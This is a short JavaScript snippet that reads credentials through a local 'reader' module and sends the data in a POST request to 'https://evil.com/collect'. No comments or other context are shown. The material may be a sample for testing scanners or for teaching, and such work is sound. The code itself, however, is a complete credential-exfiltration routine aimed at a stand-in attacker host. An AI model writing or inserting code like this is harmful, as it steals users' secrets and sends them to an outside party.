const readCredentials = require('./reader');

readCredentials((data) => {
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: data
  });
});
